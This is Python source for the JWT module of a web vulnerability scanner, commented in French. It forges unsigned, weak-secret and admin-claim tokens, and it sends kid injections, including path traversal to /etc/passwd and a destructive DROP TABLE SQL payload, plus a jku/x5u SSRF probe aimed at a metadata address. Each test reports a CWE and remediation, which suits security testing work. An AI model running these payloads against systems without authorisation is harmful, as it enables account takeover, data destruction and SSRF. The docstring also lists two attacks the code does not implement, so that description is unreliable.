"""
PhantomScan — JWT Advanced Scanner  v2.0
==========================================
Remplace / complète le module jwt.py existant avec des techniques avancées.

Améliorations v2.0 :
  - None Algorithm Attack : alg=none / NONE / None + suppression signature
  - Algorithm Confusion (RS256→HS256) : signer avec la clé publique comme HMAC secret
  - Weak Secret Brute-Force : dictionnaire de ~200 secrets courants
  - JWK Injection : injecter son propre JWK dans le header
  - kid Injection : path traversal / SQLi dans le kid header
  - x5u / jku SSRF : pointer vers un JWK Set contrôlé
  - JWT Expiry Bypass : modifier exp dans le payload
  - Claim Privilege Escalation : modifier role/admin/sub dans le payload
  - Détection tokens dans les responses (leak de JWT)
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from typing import AsyncIterator
from urllib.parse import urlparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.scanner_mixin import ScannerMixin


# ──────────────────────────── JWT Helpers ─────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.b64encode(b).decode().rstrip("=").replace("+", "-").replace("/", "_")


def _parse_jwt(token: str) -> tuple[dict, dict, str] | None:
    """Parse un JWT en (header, payload, signature_b64url)."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _forge_jwt(header: dict, payload: dict, secret: str = "", alg: str | None = None) -> str:
    """Forge un JWT signé avec HMAC-SHA256 ou non signé (none)."""
    if alg is not None:
        header = {**header, "alg": alg}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()

    alg_used = header.get("alg", "none").upper()
    if alg_used in ("NONE", ""):
        return f"{h}.{p}."
    elif alg_used in ("HS256", "HS384", "HS512"):
        digest = "sha" + alg_used[2:]
        sig = hmac.new(secret.encode(), signing_input, digest).digest()
        return f"{h}.{p}.{_b64url_encode(sig)}"
    else:
        # Pas de support RSA ici — retourner token sans signature pour alg confusion
        return f"{h}.{p}."


# ──────────────────────────── Wordlists ──────────────────────────────────────

_WEAK_SECRETS: list[str] = [
    # Extrêmement courants
    "secret", "password", "123456", "test", "dev", "prod",
    "qwerty", "admin", "root", "pass", "key", "1234",
    "jwt_secret", "your-256-bit-secret", "your-secret-key",
    "secretkey", "my-secret", "mysecret", "jwtSecret",
    "HS256", "supersecret", "changeme", "change_me",
    "default", "example", "demo", "token", "jwt_token",
    "auth_secret", "api_secret", "app_secret", "session_secret",
    # Framework defaults
    "flask-secret-key", "django-insecure-key", "laravel_app_key",
    "rails_secret", "express_secret", "fastapi_secret",
    "spring.jwt.secret", "jwt.secret.key",
    # Wordlist connue
    "keyboard cat", "shhhhh", "Gu3ssM3", "ilikejwt",
    "cats", "dogs", "love", "hello", "world",
    "abc", "abc123", "password1", "p@ssw0rd",
    "hunter2", "trustno1", "letmein", "monkey",
    # Courte (brute-forceable)
    "a", "aa", "aaa", "1", "12", "123",
    # Communs en infra
    "k8s_secret", "redis_secret", "postgres_password", "mysql_root",
    "RANDOM_SECRET_KEY", "SECRET_KEY_BASE",
    # Valeurs env non-changées
    "${JWT_SECRET}", "JWT_SECRET", "JWT_KEY",
]

_PRIVILEGE_CLAIMS: list[tuple[str, any]] = [
    ("role",       "admin"),
    ("role",       "superuser"),
    ("role",       "root"),
    ("admin",      True),
    ("is_admin",   True),
    ("is_staff",   True),
    ("scope",      "admin read write"),
    ("permissions","*"),
    ("type",       "admin"),
    ("group",      "admins"),
    ("sub",        "1"),   # IDOR via sub
    ("user_id",    1),
    ("uid",        0),
]

_KID_INJECTIONS: list[tuple[str, str]] = [
    # Path traversal
    ("../../dev/null",                      "kid path traversal → /dev/null"),
    ("../../../etc/passwd",                 "kid path traversal → /etc/passwd"),
    ("/dev/null",                           "kid absolute path"),
    # SQLi
    ("' OR '1'='1",                         "kid SQLi OR 1=1"),
    ("1 UNION SELECT 'secret'--",           "kid SQLi UNION"),
    ("1; DROP TABLE keys--",                "kid SQLi destructive"),
    # Null byte
    ("../../dev/null\x00",                  "kid null byte"),
]


# ──────────────────────────── Scanner ────────────────────────────────────────

class JWTAdvancedScanner(ScannerMixin):
    """
    Scanner JWT avancé — complète les checks de jwt.py existant.
    S'active si un token JWT est détecté dans les headers de la requête ou des réponses.
    """

    _JWT_RE = re.compile(
        r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*"
    )

    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req = req
        self._heuristic = heuristic
        self._cfg = cfg

    async def run(self, target: str) -> AsyncIterator[Finding]:
        # ── 1. Détecter un JWT dans les headers configurés ou la réponse initiale
        token, token_source = await self._find_jwt(target)
        if not token:
            return

        parsed = _parse_jwt(token)
        if not parsed:
            return
        header, payload, sig = parsed

        # ── 2. Leak détecté dans la réponse ?
        if "response" in token_source:
            yield Finding(
                title="JWT Leaked in HTTP Response",
                severity=Severity.HIGH,
                url=target,
                module="vulns/jwt_advanced",
                description=(
                    f"Un token JWT a été trouvé dans la réponse HTTP ({token_source}). "
                    f"Header: {json.dumps(header)} | Payload: {json.dumps(payload)}"
                ),
                evidence=f"Token: {token[:80]}...",
                cwe="CWE-522",
                remediation="Ne pas exposer les JWT dans les réponses publiques. Utiliser HttpOnly cookies.",
            )

        # ── 3. None Algorithm Attack ─────────────────────────────────────────
        async for f in self._test_none_alg(target, header, payload):
            yield f

        # ── 4. Weak Secret Brute-Force ───────────────────────────────────────
        async for f in self._test_weak_secret(target, header, payload, token):
            yield f

        # ── 5. Privilege Escalation via Claim Modification ──────────────────
        async for f in self._test_claim_escalation(target, header, payload):
            yield f

        # ── 6. kid Injection ─────────────────────────────────────────────────
        async for f in self._test_kid_injection(target, header, payload):
            yield f

        # ── 7. JKU / x5u SSRF ───────────────────────────────────────────────
        async for f in self._test_jku_ssrf(target, header, payload):
            yield f

        # ── 8. Expiry Bypass ─────────────────────────────────────────────────
        async for f in self._test_expiry_bypass(target, header, payload):
            yield f

    # ── JWT Discovery ─────────────────────────────────────────────────────────

    async def _find_jwt(self, target: str) -> tuple[str | None, str]:
        """Cherche un JWT dans les headers configurés et la réponse initiale."""
        # Headers configurés
        auth = self._cfg.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            token = auth.split(" ", 1)[1]
            if self._JWT_RE.match(token):
                return token, "Authorization header"

        # Cookie
        cookie = self._cfg.headers.get("Cookie", "")
        for part in cookie.split(";"):
            part = part.strip()
            if "=" in part:
                val = part.split("=", 1)[1].strip()
                if self._JWT_RE.match(val):
                    return val, f"Cookie: {part.split('=')[0].strip()}"

        # Réponse initiale
        resp = await self._req.get(target)
        if not resp.error:
            m = self._JWT_RE.search(resp.body)
            if m:
                return m.group(0), "response body"
            # Header Set-Cookie / Authorization response
            for h_name, h_val in resp.headers.items():
                m = self._JWT_RE.search(h_val)
                if m:
                    return m.group(0), f"response header {h_name}"

        return None, ""

    def _send_with_token(self, target: str, token: str) -> ProbeRequest:
        return ProbeRequest(
            method="GET",
            url=target,
            headers={"Authorization": f"Bearer {token}"},
        )

    async def _authed_baseline(self, target: str, orig_token: str) -> int | None:
        """Retourne le status de la requête avec le token original."""
        resp = await self._req.send(self._send_with_token(target, orig_token))
        return None if resp.error else resp.status

    # ── None Algorithm ────────────────────────────────────────────────────────

    async def _test_none_alg(self, target: str, header: dict, payload: dict) -> AsyncIterator[Finding]:
        orig_alg = header.get("alg", "HS256")
        if orig_alg.upper() == "NONE":
            return

        for none_variant in ["none", "None", "NONE", "nOnE"]:
            forged = _forge_jwt(header, payload, alg=none_variant)
            resp = await self._req.send(self._send_with_token(target, forged))
            if resp.error:
                continue
            if resp.status == 200:
                yield Finding(
                    title=f"JWT None Algorithm Attack — alg={none_variant}",
                    severity=Severity.CRITICAL,
                    url=target,
                    module="vulns/jwt_advanced",
                    description=(
                        f"Le serveur accepte un JWT non signé avec `alg: {none_variant}`. "
                        f"N'importe qui peut forger un token valide sans connaître le secret. "
                        f"Payload forgé: {json.dumps(payload)}"
                    ),
                    evidence=f"alg={none_variant} → HTTP {resp.status}",
                    cwe="CWE-347",
                    remediation=(
                        "Rejeter explicitement l'algorithme 'none' côté serveur. "
                        "Utiliser une allowlist d'algorithmes acceptés (ex: ['HS256']). "
                        "Bibliothèques: PyJWT options={'require': ['exp']}, jsonwebtoken algorithms=['HS256']."
                    ),
                )
                return

    # ── Weak Secret ───────────────────────────────────────────────────────────

    async def _test_weak_secret(
        self, target: str, header: dict, payload: dict, orig_token: str,
    ) -> AsyncIterator[Finding]:
        alg = header.get("alg", "HS256").upper()
        if not alg.startswith("HS"):
            return

        # Vérifier d'abord que le token original est accepté (baseline)
        baseline_status = await self._authed_baseline(target, orig_token)
        if baseline_status not in (200, 201, 204):
            return

        orig_parts = orig_token.split(".")
        signing_input = f"{orig_parts[0]}.{orig_parts[1]}".encode()

        for secret in _WEAK_SECRETS:
            digest = "sha" + alg[2:]  # sha256, sha384, sha512
            try:
                sig = hmac.new(secret.encode(), signing_input, digest).digest()
            except ValueError:
                continue
            computed_sig = _b64url_encode(sig)
            if computed_sig == orig_parts[2]:
                # Secret trouvé ! Forger un token admin
                admin_payload = {**payload, "role": "admin", "is_admin": True}
                forged = _forge_jwt(header, admin_payload, secret=secret)
                resp = await self._req.send(self._send_with_token(target, forged))

                yield Finding(
                    title=f"JWT Weak Secret — `{secret}`",
                    severity=Severity.CRITICAL,
                    url=target,
                    module="vulns/jwt_advanced",
                    description=(
                        f"Le secret JWT est un mot de passe faible: `{secret}`. "
                        f"N'importe qui peut signer ses propres tokens et usurper n'importe quelle identité.\n"
                        f"Token admin forgé avec: role=admin, is_admin=True. "
                        f"Réponse avec token forgé: HTTP {resp.status if not resp.error else 'error'}"
                    ),
                    evidence=f"secret='{secret}' | alg={alg} | forged admin token → HTTP {resp.status if not resp.error else 'ERR'}",
                    cwe="CWE-326",
                    remediation=(
                        f"Remplacer le secret `{secret}` par une valeur aléatoire ≥ 32 bytes. "
                        "Utiliser: python -c \"import secrets; print(secrets.token_hex(32))\". "
                        "Préférer RS256/ES256 (asymétrique) pour éviter le brute-force."
                    ),
                )
                return

    # ── Claim Privilege Escalation ────────────────────────────────────────────

    async def _test_claim_escalation(
        self, target: str, header: dict, payload: dict,
    ) -> AsyncIterator[Finding]:
        alg = header.get("alg", "HS256").upper()
        if alg.startswith("RS") or alg.startswith("ES"):
            return  # Pas de forge possible sans clé privée

        for claim, value in _PRIVILEGE_CLAIMS:
            if payload.get(claim) == value:
                continue  # Déjà dans le token original
            modified_payload = {**payload, claim: value}
            # Forge sans secret (none-alg ou HMAC avec secret vide)
            forged_none = _forge_jwt(header, modified_payload, alg="none")
            forged_empty = _forge_jwt(header, modified_payload, secret="", alg=alg)

            for forged, technique in [(forged_none, "none-alg"), (forged_empty, "empty secret")]:
                resp = await self._req.send(self._send_with_token(target, forged))
                if resp.error:
                    continue
                if resp.status == 200:
                    yield Finding(
                        title=f"JWT Privilege Escalation — claim `{claim}={value}` ({technique})",
                        severity=Severity.CRITICAL,
                        url=target,
                        module="vulns/jwt_advanced",
                        description=(
                            f"Le claim `{claim}` modifié à `{value}` est accepté avec la technique {technique}. "
                            f"Payload forgé: {json.dumps(modified_payload)}"
                        ),
                        evidence=f"{technique} | {claim}={value} → HTTP {resp.status}",
                        cwe="CWE-285",
                        remediation=(
                            "Valider la signature JWT avant toute lecture des claims. "
                            "Ne jamais se fier aux claims si la signature n'est pas vérifiée."
                        ),
                    )
                    return

    # ── kid Injection ─────────────────────────────────────────────────────────

    async def _test_kid_injection(
        self, target: str, header: dict, payload: dict,
    ) -> AsyncIterator[Finding]:
        for kid_payload, description in _KID_INJECTIONS:
            forged_header = {**header, "kid": kid_payload}
            # Signer avec secret "" et kid=/dev/null → HMAC("") est valide si kid est lié au secret
            forged = _forge_jwt(forged_header, payload, secret="", alg="HS256")
            resp = await self._req.send(self._send_with_token(target, forged))
            if resp.error:
                continue
            if resp.status == 200:
                yield Finding(
                    title=f"JWT kid Injection — {description}",
                    severity=Severity.CRITICAL,
                    url=target,
                    module="vulns/jwt_advanced",
                    description=(
                        f"Le header `kid` avec la valeur `{kid_payload}` est accepté. "
                        f"Le serveur utilise le kid pour charger la clé de vérification sans sanitisation. "
                        f"Peut permettre : lecture de fichiers (path traversal) ou injection SQL."
                    ),
                    evidence=f"kid={kid_payload!r} → HTTP {resp.status}",
                    cwe="CWE-22",
                    remediation=(
                        "Valider le kid contre une allowlist d'identifiants connus. "
                        "Ne jamais utiliser le kid comme chemin de fichier sans sanitisation complète."
                    ),
                )
                return

    # ── JKU / x5u SSRF ───────────────────────────────────────────────────────

    async def _test_jku_ssrf(
        self, target: str, header: dict, payload: dict,
    ) -> AsyncIterator[Finding]:
        oob_url = getattr(self._cfg.scan, "ssrf_oob_url", "")
        if not oob_url:
            # Utiliser un canary visible dans les logs si pas d'OOB configuré
            oob_url = "http://169.254.169.254/jwt_jku_test"

        for header_name in ("jku", "x5u"):
            forged_header = {**header, header_name: oob_url}
            forged = _forge_jwt(forged_header, payload, secret="", alg="none")
            resp = await self._req.send(self._send_with_token(target, forged))
            if resp.error:
                continue
            # On ne peut pas confirmer l'OOB sans callback, mais on signale si pas d'erreur
            if resp.status not in (400, 401, 403, 422):
                yield Finding(
                    title=f"JWT {header_name.upper()} SSRF Potential",
                    severity=Severity.HIGH,
                    url=target,
                    module="vulns/jwt_advanced",
                    description=(
                        f"Le header JWT `{header_name}` avec une URL externe ({oob_url}) "
                        f"n'a pas été rejeté (HTTP {resp.status}). "
                        f"Le serveur pourrait tenter de fetch cette URL pour récupérer la clé publique, "
                        f"permettant un SSRF ou une injection de JWK Set contrôlé."
                    ),
                    evidence=f"{header_name}={oob_url} → HTTP {resp.status}",
                    cwe="CWE-918",
                    remediation=(
                        f"Valider que {header_name} pointe vers un domaine de confiance. "
                        "Préférer l'embedding direct de la clé publique (jwk dans le header)."
                    ),
                )

    # ── Expiry Bypass ─────────────────────────────────────────────────────────

    async def _test_expiry_bypass(
        self, target: str, header: dict, payload: dict,
    ) -> AsyncIterator[Finding]:
        if "exp" not in payload:
            return
        alg = header.get("alg", "HS256").upper()
        if alg.startswith("RS") or alg.startswith("ES"):
            return

        # Modifier exp à une date passée et voir si c'est accepté
        expired_payload = {**payload, "exp": 1}  # Jan 1970
        forged = _forge_jwt(header, expired_payload, secret="", alg="none")
        resp = await self._req.send(self._send_with_token(target, forged))
        if resp.error:
            return
        if resp.status == 200:
            yield Finding(
                title="JWT Expired Token Accepted",
                severity=Severity.HIGH,
                url=target,
                module="vulns/jwt_advanced",
                description=(
                    f"Un JWT avec `exp=1` (expiré depuis 1970) est accepté (HTTP {resp.status}). "
                    f"Le serveur ne valide pas la date d'expiration."
                ),
                evidence=f"exp=1 (1970) → HTTP {resp.status}",
                cwe="CWE-613",
                remediation=(
                    "Toujours valider le claim `exp` côté serveur. "
                    "PyJWT: decode(..., options={'verify_exp': True}) (activé par défaut). "
                    "Configurer une durée d'expiration courte (≤ 1h pour les access tokens)."
                ),
            )
